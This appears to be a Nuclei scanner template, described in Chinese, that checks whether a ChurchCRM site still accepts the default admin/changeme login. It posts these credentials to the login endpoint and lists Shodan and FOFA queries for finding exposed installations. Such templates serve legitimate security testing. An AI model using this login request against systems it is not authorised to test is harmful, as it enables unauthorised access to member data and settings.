id: churchcrm-default-login

info:
  name: ChurchCRM 默认口令登录（弱口令）
  author: Kazgangap
  severity: high
  description: |
    该模板通过尝试 ChurchCRM 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/ChurchCRM/CRM
  metadata:
    vendor: churchcrm
    product: churchcrm
    shodan-query: http.title:"churchcrm"
    fofa-query: app="churchcrm"
  tags: default-login,churchcrm,vuln

http:
  - raw:
      - |
        POST /session/begin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        User={{username}}&Password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - changeme

    host-redirects: true

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "ChurchCRM", "Dashboard", "Change Password")'
          - 'status_code == 200'
        condition: and
